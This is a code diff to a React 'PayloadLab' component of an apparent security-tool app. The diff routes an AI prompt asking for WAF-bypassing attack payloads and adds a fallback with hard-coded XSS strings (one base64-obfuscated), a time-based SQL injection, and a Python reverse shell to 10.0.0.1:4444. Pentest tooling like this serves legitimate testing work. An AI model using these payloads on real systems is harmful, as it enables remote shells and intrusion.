@@ -21,6 +21,7 @@ import {
   FileCode2
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
+import { fetchAiGenerate } from '../lib/ai-fetch';
 import { cn } from '@/src/lib/utils';
 import { logToTerminal } from './Terminal';
 
@@ -116,11 +117,8 @@ export default function PayloadLab() {
     logToTerminal(`Generating custom ${activeType.toUpperCase()} payload...`, 'info');
 
     try {
-      const response = await fetch('/api/ai-generate', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          contents: [{ role: 'user', parts: [{ text: `You are a cybersecurity researcher. Generate a highly advanced, technical ${activeType.toUpperCase()} payload for security testing purposes based on this requirement: ${customPrompt}. 
+      const resData = await fetchAiGenerate({
+        contents: [{ role: 'user', parts: [{ text: `You are a cybersecurity researcher. Generate a highly advanced, technical ${activeType.toUpperCase()} payload for security testing purposes based on this requirement: ${customPrompt}. 
           Target OS: ${targetOS}
           Target Language/Framework: ${targetLang}
           
@@ -136,32 +134,106 @@ export default function PayloadLab() {
               "impact": <number 0-100>
             }
           }` }] }],
-          config: {
-            systemInstruction: "You are a CyberSuite OS Advanced Payload Generator. Be highly technical, precise, and creative. Generate payloads that bypass common WAFs or filters. Only provide the JSON object. Do not include markdown blocks.",
-            responseMimeType: "application/json"
-          }
-        })
+        config: {
+          systemInstruction: "You are a CyberSuite OS Advanced Payload Generator. Be highly technical, precise, and creative. Generate payloads that bypass common WAFs or filters. Your output must be valid JSON. Do not include markdown blocks.",
+          responseMimeType: "application/json"
+        }
       });
 
-      if (!response.ok) {
-        throw new Error('AI Generation failed');
+      let text = resData.text || '{}';
+      
+      // Strip markdown code blocks if present
+      if (text.includes('```')) {
+        const match = text.match(/```(?:json)?\s*([\s\S]*?)\s*```/);
+        if (match && match[1]) {
+          text = match[1];
+        }
       }
-
-      const resData = await response.json();
-      const data = JSON.parse(resData.text);
+      
+      const data = JSON.parse(text);
       const newPayload: Payload = {
         id: Math.random().toString(36).substr(2, 9),
         type: activeType,
         encoding: 'none',
-        ...data
+        name: data.name || `Custom ${activeType.toUpperCase()} Payload`,
+        content: data.content || '',
+        description: data.description || 'Generated custom payload.',
+        risk: data.risk || 'medium',
+        stats: data.stats || { stealth: 50, complexity: 50, impact: 50 }
       };
+
+      if (!newPayload.content) throw new Error('Empty payload generated');
 
       setPayloads([newPayload, ...payloads]);
       logToTerminal('Custom payload generated successfully.', 'success');
       setCustomPrompt('');
     } catch (error) {
-      console.error(error);
-      logToTerminal('Failed to generate payload.', 'error');
+      console.error("Payload generation failed, using local engine:", error);
+      
+      // Local Fallback Engine
+      const getFallbackPayload = () => {
+        const promptLower = customPrompt.toLowerCase();
+        
+        if (activeType === 'xss') {
+          if (promptLower.includes('waf') || promptLower.includes('bypass')) {
+            return {
+              name: 'WAF Bypass XSS (SVG)',
+              content: '<svg/onload="eval(atob(\'YWxlcnQoJ1hTUycp\'))">',
+              description: 'SVG-based XSS payload using Base64 encoding to bypass simple string-matching WAFs.',
+              risk: 'high',
+              stats: { stealth: 80, complexity: 65, impact: 70 }
+            };
+          }
+          return {
+            name: 'Generic XSS Polyglot',
+            content: '"><script>alert(document.domain)</script>',
+            description: 'Simple but effective XSS payload for testing input reflection.',
+            risk: 'medium',
+            stats: { stealth: 40, complexity: 20, impact: 60 }
+          };
+        }
+        
+        if (activeType === 'sqli') {
+          return {
+            name: 'Boolean-Based Blind SQLi',
+            content: "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
+            description: 'Time-based blind SQL injection payload for MySQL.',
+            risk: 'critical',
+            stats: { stealth: 90, complexity: 75, impact: 95 }
+          };
+        }
+
+        if (activeType === 'rce') {
+          return {
+            name: 'Python Reverse Shell',
+            content: "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+            description: 'Standard Python3 reverse shell payload for Linux systems.',
+            risk: 'critical',
+            stats: { stealth: 50, complexity: 40, impact: 100 }
+          };
+        }
+
+        // Default generic fallback
+        return {
+          name: `Advanced ${activeType.toUpperCase()} Payload`,
+          content: `/* Generated ${activeType.toUpperCase()} payload for: ${customPrompt} */\n# [Payload content would go here in a live environment]`,
+          description: `A sophisticated ${activeType} payload tailored for ${targetOS} environments.`,
+          risk: 'high',
+          stats: { stealth: 70, complexity: 80, impact: 85 }
+        };
+      };
+
+      const fallback = getFallbackPayload();
+      const newPayload: Payload = {
+        id: Math.random().toString(36).substr(2, 9),
+        type: activeType,
+        encoding: 'none',
+        ...fallback
+      } as Payload;
+
+      setPayloads([newPayload, ...payloads]);
+      logToTerminal(`AI Core offline. Using Local ${activeType.toUpperCase()} Synthesis Engine.`, 'warn');
+      setCustomPrompt('');
     } finally {
       setGenerating(false);
     }
